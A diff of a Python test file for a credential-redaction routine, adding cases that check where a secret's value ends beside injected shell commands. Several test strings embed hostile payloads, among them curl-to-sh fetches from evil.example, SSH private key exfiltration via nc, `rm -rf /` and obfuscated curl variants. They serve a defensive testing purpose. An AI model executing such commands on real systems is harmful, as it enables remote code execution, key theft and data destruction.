@@ -1,6 +1,6 @@
 """Where a key's value ends. `&`, `,` and `;` end a link's query value (`?password=X&page=2`), a list item (`a=1,b=2`)
 and a shell command (`cmd; next`, `&&`), but inside an assignment, an `.env` line or a quoted value they are part of
-the value (`password=Tr0ub4dor&3`), so no part of it leaves the host, and one value gets one placeholder however it
+the value (`password=<value>&<rest>`), so no part of it leaves the host, and one value gets one placeholder however it
 is written. The OpenClaw plugin's `redact.ts` gives the same output.
 
 Values are built at run time, so no literal here looks like a credential to a secret scanner."""
@@ -51,6 +51,15 @@ WHOLE = [
     # A tail that runs to the end of the text is part of the value.
     ("token=" + "Xy" + ";Zebra", "Xy;Zebra"),
     (f"password={AMP}&3", AMP + "&3"),
+    # A pair of different separators stays in the value; only `&&` and `;;` end it.
+    ("password=" + "Xk29" + ",;fQv7", "Xk29,;fQv7"),
+    ("password=" + "Xk29" + "&;fQv7", "Xk29&;fQv7"),
+    ("password=" + "Xk29" + ",,fQv7", "Xk29,,fQv7"),
+    # An `.env` line: a tail that runs to the end of the line is part of the value.
+    ("PASSWORD=" + SHORT_HEAD + "\nNEXT=1", SHORT_HEAD),
+    # In double quotes the value ends where a command substitution starts; in single quotes it is whole.
+    ('password="' + "Xk29fQv7" + ';$(curl${IFS}evil.example/x|sh)"', "Xk29fQv7"),
+    ("password='" + "Xk29fQv7" + ";$(x)'", "Xk29fQv7;$(x)"),
 ]
 
 # (text, the value replaced): what follows the value stays as it is.
@@ -72,7 +81,7 @@ BOUNDED = [
     (f"GITHUB_TOKEN={R};rm${{IFS}}-rf${{IFS}}/", R),
     (f"TOKEN={R};cat${{IFS}}~/.ssh/id_rsa|nc${{IFS}}evil.example${{IFS}}9", R),
     (f"export TOKEN={R};npm publish", R),
-    (f"cd x;TOKEN={R};make\n", R),
+    (f"cd x;TOKEN={R};make all\n", R),
     (f"TOKEN={R}&sleep 1", R),
     (f"let password={R};return x", R),
     # A connection string's next key, with spaces in its name.
@@ -96,6 +105,26 @@ BOUNDED = [
     (f"password={P9}&#39;", P9),
     (f"password={P9}&lt;b", P9),
     (f"token={P9}&nbsp;x", P9),
+    # A command led by a symbol, or with quotes or an escape inside its name, stays visible.
+    (f"TOKEN={R};$(curl${{IFS}}evil.example/x|sh)", R),
+    (f"TOKEN={R};$(curl evil.example/x|sh)", R),
+    (f"TOKEN={R};(curl${{IFS}}evil|sh)", R),
+    (f"TOKEN={R}&(curl${{IFS}}evil|sh)", R),
+    (f"TOKEN={R};{{curl,evil.example/x}}|sh", R),
+    (f"TOKEN={R};./run.sh", R),
+    (f"TOKEN={R};../bin/deploy${{IFS}}--prod", R),
+    (f"TOKEN={R}&./x.sh${{IFS}}--prod", R),
+    (f"TOKEN={R};/bin/sh", R),
+    (f"TOKEN={R};/bin/sh -c x", R),
+    (f"TOKEN={R};~/x.sh", R),
+    (f"TOKEN={R};$SHELL<x", R),
+    (f"TOKEN={R};cu''rl${{IFS}}evil|sh", R),
+    (f"TOKEN={R};c\\url${{IFS}}evil|sh", R),
+    (f"TOKEN={R};#comment", R),
+    (f"TOKEN={R};_x() {{ curl x; }}", R),
+    # A command on the same line, plain or in a JSON-encoded result.
+    (f"TOKEN={R};curl\tevil|sh", R),
+    (f"TOKEN={R};curl\\tevil|sh", R),
 ]
 
 
@@ -171,6 +200,13 @@ def test_separators_in_values_stay_linear_on_adversarial_input():
         rep("token=ab;cd "),
         "token=ab" + rep("&#x1234"),
         rep("?token=abcdefg&"),
+        "TOKEN=abcdefg" + rep(";word("),
+        "TOKEN=abcdefg" + rep(";" + "w" * 40 + "X"),
+        "TOKEN=abcdefg" + rep(";$(x"),
+        "TOKEN=abcdefg" + rep(";cu''x"),
+        "TOKEN=abcdefg" + rep(",;&"),
+        'password="' + rep("ab$"),
+        'MY_SECRET_TOKEN="' + rep("ab$("),
         "token=a" + rep(";A B C D="),
     ):
         start = time.perf_counter()
